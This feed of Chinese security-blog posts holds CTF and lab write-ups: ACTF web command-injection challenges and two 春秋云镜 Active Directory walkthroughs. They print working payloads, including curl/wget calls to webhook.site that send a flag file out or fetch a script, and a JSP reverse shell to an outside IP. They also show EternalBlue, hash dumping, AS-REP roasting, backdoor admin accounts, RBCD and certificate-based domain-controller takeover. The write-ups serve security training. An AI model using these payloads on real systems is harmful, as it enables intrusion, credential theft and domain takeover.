</p><p><a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution</a></p><p>非预期就是靶机有问题  别人解出的flag直接就是会在日志里  然后大家都能看到了</p><p>预期解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正解</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/plzfailme</span><br><span class="line"></span><br><span class="line">另一种解法：</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????%09-oN%09public/114.html</span><br><span class="line">http://192.168.247.18:3333/114.html</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231101105029814.png" alt="image-20231101105029814"></p><h2 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="~Ave Mujica’s Masquerade~"></a>~Ave Mujica’s Masquerade~</h2><p>这题的话是上面那题的升级版</p><p>只不过是另一个考点</p><p><img src="../images/image-20231101105439024.png" alt="image-20231101105439024"></p><p>其实重点就是绕过他  <img src="../images/image-20231101105542128.png" alt="image-20231101105542128"></p><p>是存在一个洞的这个版本</p><p><a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a>  这篇文章看懂就出</p><p>payload1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">curl -T /flag-???????????????? http://webhook.site/&lt;id&gt;/</span><br><span class="line"></span><br><span class="line">网站执行</span><br><span class="line">http://&lt;url&gt;/checker?url=127.0.0.1:`:`wget$IFS\webhook.site/&lt;id&gt;/$IFS\-O$IFS/tmp/s.sh``:`</span><br><span class="line">http:/&lt;url/checker?url=127.0.0.1:`:`sh$IFS\/tmp/s.sh``:`</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`mkdir$IFS$1public``%3a%23</span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`find$IFS$1/$IFS$1-name$IFS$1flag-*$IFS$1-exec$IFS$1cp$IFS$1&#123;&#125;$IFS$1./public/6.png$IFS$1\;``%3a%23</span><br><span class="line">http://124.70.33.170:24001/6.png</span><br></pre></td></tr></table></figure><p>payload3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.33.170:24001/checker?url=1:`:`sleep$IFS\9``:` </span><br><span class="line"></span><br><span class="line">exp</span><br><span class="line">http://124.70.33.170:24001/checker?url=0%00%3A%60%3A%60python3%24IFS%5C-c%24IFS%5Cexec%28chr%28105%29%2Bchr%28109%29%2Bchr%28112%29%2Bchr%28111%29%2Bchr%28114%29%2Bchr%28116%29%2Bchr%2832%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2861%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2846%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2840%29%2Bchr%2839%29%2Bchr%2847%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2842%29%2Bchr%2839%29%2Bchr%2841%29%2Bchr%2891%29%2Bchr%2848%29%2Bchr%2893%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%2834%29%2Bchr%28112%29%2Bchr%28117%29%2Bchr%2898%29%2Bchr%28108%29%2Bchr%28105%29%2Bchr%2899%29%2Bchr%2847%29%2Bchr%2849%29%2Bchr%2849%29%2Bchr%2852%29%2Bchr%2846%29%2Bchr%28104%29%2Bchr%28116%29%2Bchr%28109%29%2Bchr%28108%29%2Bchr%2834%29%2Bchr%2844%29%2Bchr%2834%29%2Bchr%28119%29%2Bchr%2834%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2846%29%2Bchr%28119%29%2Bchr%28114%29%2Bchr%28105%29%2Bchr%28116%29%2Bchr%28101%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2846%29%2Bchr%28114%29%2Bchr%28101%29%2Bchr%2897%29%2Bchr%28100%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2841%29%2Bchr%2859%29%29%60%60%3A%60</span><br><span class="line">http://124.70.33.170:24001/114.html</span><br><span class="line"></span><br><span class="line">//这里是用chr来绕过</span><br><span class="line">ACTF&#123;Th3_only_1_I_c4n_tRUST_is_mySeLf&#125;</span><br></pre></td></tr></table></figure><p><a href="https://ml-hacker.github.io/2023/10/31/ACTF/">https://ml-hacker.github.io/2023/10/31/ACTF/</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://su-team.cn/passages/2023-10-28-ACTF/&quot;&gt;https://su-team.cn/passages/2023-10-28-ACTF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wm-ctf-te</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-网鼎半决赛</title>
    <link href="https://ke1nys.github.io/posts/7fa7855c.html"/>
    <id>https://ke1nys.github.io/posts/7fa7855c.html</id>
    <published>2023-10-27T01:31:14.000Z</published>
    <updated>2023-11-07T14:23:59.805Z</updated>
    
    <content type="html"><![CDATA[<p>先fscan扫一下</p><p><img src="../images/image-20231027094654730.png" alt="image-20231027094654730"></p><p>就开了个80端口</p><p><img src="../images/image-20231027094735843.png" alt="image-20231027094735843"></p><p>是wp框架  直接wpscan开扫</p><p><img src="../images/image-20231027095031239.png" alt="image-20231027095031239"></p><p>并没有发现什么有用的东西   直接去访问后台 <code>/wp-admin</code></p><p>存在弱口令登录  <code>admin/123456</code></p><p><img src="../images/image-20231027095305128.png" alt="image-20231027095305128"></p><p>然后在后台处写马  然后访问路径并连接蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027095514155.png" alt="image-20231027095514155"></p><p>这里不需要提权  www-data权限就能够访问flag了</p><p>这里的话有个点就是这个靶机不开3306端口(或者其他替代3306端口的端口)  导致看到config.php的数据库配置内容  也不能连接数据库</p><p><img src="../images/image-20231027095730384.png" alt="image-20231027095730384"></p><p>接下来就是扫内网挂代理了</p><p>先弹个shell到vps上  不想在蚁剑终端进行操作</p><p><img src="../images/image-20231027100032377.png" alt="image-20231027100032377"></p><p><img src="../images/image-20231027100119190.png" alt="image-20231027100119190"></p><p>信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">172.22.15.26   getshell主机</span><br><span class="line"></span><br><span class="line">172.22.15.13   XR-DC01   XR-DC01.xiaorang.lab</span><br><span class="line"></span><br><span class="line">172.22.15.18   XR-CA XR-CA.xiaorang.lab   (poc-yaml-active-directory-certsrv-detect)</span><br><span class="line"></span><br><span class="line">172.22.15.24  3306  XR-WIN08   MS17-010</span><br><span class="line"></span><br><span class="line">172.22.15.35   XR-0687  XIAORANG\XR-0687</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>域内一共五台机器  </p><p>直接去打ms17就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.15.24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>这里需要打两次   第一次打会超时   我们得打第二次</p><p><img src="../images/image-20231027100652974.png" alt="image-20231027100652974"></p><p>hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>psexec连上去(因为这里的meterpreter不能进入shell………………….)  也可以直接读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py -hashes :0e52d03e9b939997401466a0ec5a9cbc xiaorang.lab/administrator@172.22.15.24 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101013547.png" alt="image-20231027101013547"></p><p>然后rdp上去  看看有什么东西</p><p>直接新建有个用户上去的话会报错   (修复方法 <a href="https://blog.csdn.net/juanjuan_01/article/details/127005255">方法一</a>   <a href="https://blog.csdn.net/weixin_40276431/article/details/111034925?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-111034925-blog-127005255.235^v38^pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">方法二</a> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br><span class="line">//或者直接修改administrator的密码也行</span><br><span class="line">net user administrator qwer1234!</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101337213.png" alt="image-20231027101337213"></p><p>看到有个小皮  并且之前扫出来他有个页面</p><p><img src="../images/image-20231027101415212.png" alt="image-20231027101415212"></p><p>去翻之前的信息的话还发现其开了3306端口  然后去查看www下的源码 </p><p><img src="../images/image-20231027101517544.png" alt="image-20231027101517544"></p><p>发现其还有个数据库管理后台  直接小皮看密码  然后登录</p><p><img src="../images/image-20231027101557478.png" alt="image-20231027101557478"></p><p><img src="../images/image-20231027101654403.png" alt="image-20231027101654403"></p><p>发现用户  直接以csv格式导出  然后execl打开并把用户名那一列单独拿出来跑 <strong>AS-REP Roasting</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile user.txt -request</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027101921486.png" alt="image-20231027101921486"></p><p>爆出两个session_key 直接hashcat破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$lixiuying@XIAORANG.LAB:013bd18856b9a83c5c5d8744b23468a4$6060145fa7ee7522bf8b8cd88215f2375ffaed5e78a5ed25764856be6e69ebc4c43c441d3d81df811cb4d8b9f5369e98f33904c5e40b133b6afb63742624cdd14f3d83bb1026c850b2d57364f4fe4b564ddfa2cf8d9db1cd5a613101d6855c090fb785ee900e661833636e558d37e88aebb6153b45a8d5abc05fb12af52fc44fbed031bccd9740e42c021469f4bfddc8194de2e36450baf9848f5799f8b4f487705c50c2def3a20b4515aab06884711d94e126d8fc666d3256dbe7f74651d6f077d5095913364f38903324d1a33bcc343f0b0bb10c06a3cee9c196ff0419aef1e149e4c4dea501ad34b20154</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5asrep$23$huachunmei@XIAORANG.LAB:b3479f9803b3fc703d83ceb0fc43520e$7fc9597624a5e59b566fe9b7244bbb5b79ba2ed8e647a4a576881ba493c578c2eb8b6a72224a84e63cb376af69eb2b9bb6533e095c6f8e716601a32fc361c6bc2b3457b0d6c63b16a6567394ab2655aa8485eb9dc0d3da4d2e0b1885e69f2bccfa48c59c8b5f3104a08bf139b81186e47f994f722a389aa27e0a563c6b33cf7eaaa57faa8b026864ebbfbcba183aee423f1ef2632d59848496503035fe9c19cb03a19e4d512e348d7565690f73b0d22e789081dc7404c6e7d49913a2409496e3aa57b56c7f57d3b988960650807cb06cd45023a37991e8a897b40f1d3c1178d0fd0a0794d562e42738c60121</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027102232491.png" alt="image-20231027102232491"></p><p>另一个同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiuying:winniethepooh</span><br><span class="line">huachunmei:1qaz2wsx</span><br></pre></td></tr></table></figure><p>用crackmapexec跑一下  看看情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.15.0/24 -u lixiuying -p winniethepooh -d xiaorang.lab</span><br><span class="line">(13 18 35)</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.15.0/24 -u huachunmei -p 1qaz2wsx -d xiaorang.lab</span><br><span class="line">(13 18 35)</span><br><span class="line"></span><br><span class="line">域控和CA不太可能   直接去rdp试试35</span><br></pre></td></tr></table></figure><p>这里不直接跑rdp的原因时太乱了 根本跑不出来  直接就smb也差不多</p><p><img src="../images/image-20231027102620548.png" alt="image-20231027102620548"></p><p>能rdp成功  直接跑一下sharphound</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p>然后分析域内环境  (主要时对我们刚刚获取到的两个用户进行分析  看看有没有什么特俗的权限)</p><p><img src="../images/image-20231027102829106.png" alt="image-20231027102829106"></p><p>这里时发现了lixiuying这个用户对XR-0687这台机器具有<code>genericwrite</code>权限   直接RBCD开打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/lixiuying:&#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -action write -delegate-to &#x27;XR-0687$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">vi /etc/hosts</span><br><span class="line"></span><br><span class="line">proxychains psexec.py administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027103231807.png" alt="image-20231027103231807"></p><p>拿下第三个flag</p><p>这里的话就剩最后有个CA靶机和域控了 </p><p><img src="../images/image-20231027103352765.png" alt="image-20231027103352765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.15.18  XR-CA.xiaorang.lab   (poc-yaml-active-directory-certsrv-detect) </span><br><span class="line"></span><br><span class="line">//并且在这个fscan扫描的时候还爆出了漏洞</span><br></pre></td></tr></table></figure><p>用certify扫一下  看看有没有模板漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;lixiuying@xiaorang.lab&#x27; -p &#x27;winniethepooh&#x27; -dc-ip 172.22.15.13 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027103622596.png" alt="image-20231027103622596"></p><p>找到ESC8这个漏洞  但是这个漏洞的话打起来有点麻烦  我们就想去尝试去看看CVE-2022–26923这个洞能不能打</p><p><a href="https://forum.butian.net/share/1578">https://forum.butian.net/share/1578</a>    这篇文章很详细的分析了这个漏洞</p><p><img src="../images/image-20231027103810413.png" alt="image-20231027103810413"></p><p>能创建成功  说明存在这个漏洞  然后接着往下打就行</p><p>申请证书模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad req -u &#x27;TEST2$@xiaorang.lab&#x27; -p &#x27;P@ssw0rd&#x27; -ca &#x27;xiaorang-XR-CA-CA&#x27; -target 172.22.15.18 -template &#x27;Machine&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104013791.png" alt="image-20231027104013791"></p><p><strong>(这里申请的证书能打域控的原因就是这里修改了dns-host-name为域控)</strong></p><p><strong>这也是造成这个CVE的原因</strong></p><p>申请TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104101937.png" alt="image-20231027104101937"></p><p>报错了  这个报错和我之前打<code>shadow credentials</code>的时候报错是一模一样的</p><p><a href="https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/">https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/</a>   这位师傅解决了这个问题</p><p>大致就是 AD 默认支持两种协议的证书身份验证: Kerberos PKINIT 协议和 Schannel</p><p>这里的话报错是<strong>因为域控制器没有安装用于智能卡身份验证的证书</strong>（例如，使用 “域控制器” 或 “域控制器身份验证” 模板）、用户密码已过期或提供了错误的密码时，可能会出现此问题。</p><p>所以可以尝试 Schannel</p><p>即通过 Schannel 将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD / DCSync), 进而获得域控权限</p><p><strong>工具地址  <a href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a></strong></p><p>先用whoami测试是否可行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在测试之前  记得先将xr-dc01.pfx  转为user.crt  和   user.key</span><br><span class="line">certipy-ad cert -pfx xr-dc01.pfx -nokey -out user.crt</span><br><span class="line">certipy-ad cert -pfx xr-dc01.pfx -nocert -out user.key</span><br><span class="line"></span><br><span class="line">然后进行whoami测试</span><br><span class="line"></span><br><span class="line">proxychains python3 passthecert.py -action whoami -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027104831029.png" alt="image-20231027104831029"></p><p>接下直接打域控的rbcd就完事了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to &#x27;XR-DC01$&#x27; -delegate-from &#x27;TEST2$&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027105049002.png" alt="image-20231027105049002"></p><p>申请TGS’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST2$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p>无密码连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@XR-DC01.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231027105245189.png" alt="image-20231027105245189"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231027094654730.png&quot; alt=&quot;image-20231027094654730&quot;&gt;&lt;/p&gt;
&lt;p&gt;就开了个80端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Spoofing</title>
    <link href="https://ke1nys.github.io/posts/ac5e4dda.html"/>
    <id>https://ke1nys.github.io/posts/ac5e4dda.html</id>
    <published>2023-10-25T11:08:02.000Z</published>
    <updated>2023-10-25T14:13:34.198Z</updated>
    
    <content type="html"><![CDATA[<p>先用fscan扫一下</p><p><img src="../images/image-20231025193232597.png" alt="image-20231025193232597"></p><p>就只扫到一个8080  8009端口和一个后台管理系统 </p><p><img src="../images/image-20231025193313805.png" alt="image-20231025193313805"></p><p>其实搜一下就会发现这是个tomcat   访问8080端口的  发现是个纯静态网页  没啥用  直接开扫目录</p><p><img src="../images/image-20231025193500422.png" alt="image-20231025193500422"></p><p><img src="../images/image-20231025193843475.png" alt="image-20231025193843475"></p><p>访问docs目录</p><p><img src="../images/image-20231025193919376.png" alt="image-20231025193919376"></p><p>有洞  直接去找poc来打</p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009  /WEB-INF/web.xml read</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194055367.png" alt="image-20231025194055367"></p><p>发现有个UploadServlet路由  访问并且上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传文件</p><p><img src="../images/image-20231025194249510.png" alt="image-20231025194249510"></p><p>这个上传路径就是关键了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt</span><br></pre></td></tr></table></figure><p>然后用上面的工具直接来打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009 /upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt   eval</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194459228.png" alt="image-20231025194459228"></p><p>root权限直接拿flag就行了</p><p><img src="../images/image-20231025194609005.png" alt="image-20231025194609005"></p><p>然后收集信息  挂代理扫内网了</p><p><img src="../images/image-20231025194647224.png" alt="image-20231025194647224"></p><p><img src="../images/image-20231025195054731.png" alt="image-20231025195054731"></p><p>信息收集一下  然后整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.76  getshell机器</span><br><span class="line"></span><br><span class="line">172.22.11.6  域控机器 DC  DC XIAORANG\XIAORANG-DC</span><br><span class="line"> </span><br><span class="line">172.22.11.26  XIAORANG\XR-LCM3AE8B</span><br><span class="line"></span><br><span class="line">172.22.11.45   MS17-010   XR-DESKTOP.xiaorang.lab  </span><br></pre></td></tr></table></figure><p>有个MS17  直接打就行了   (这里建议用本地msf打  不然会报错  原因是啥我也不知道)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025195542199.png" alt="image-20231025195542199"></p><p><img src="../images/image-20231025200113679.png" alt="image-20231025200113679"></p><p>然后直接导出本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XR-DESKTOP$  XIAORANG  0e1f6735dcf951891dbf20a4f0097423  4001c14de86e59f69085d140df5fada9ed2c19ca</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yangmei      xrihGHgoNZQ  //获取到了有个明文和hash密码</span><br></pre></td></tr></table></figure><p>yangmei这个用户可以rdp到ms17这个主机上   跑个sharphound没发现啥有用的信息  于是回到这个题目本身  发现给了个提示 WebClient</p><p><img src="../images/image-20231025201301198.png" alt="image-20231025201301198"></p><p><strong>(这就是为啥不直接打rbcd的原因  不能创建机器账户是其一  并且也不知道yangmei用户是否有写属性的)</strong></p><p>扫描WebClient</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav</span><br></pre></td></tr></table></figure><p>只有26的这台机器存在<code>Webclient</code>服务</p><p><img src="../images/image-20231025202543946.png" alt="image-20231025202543946"></p><p><strong><img 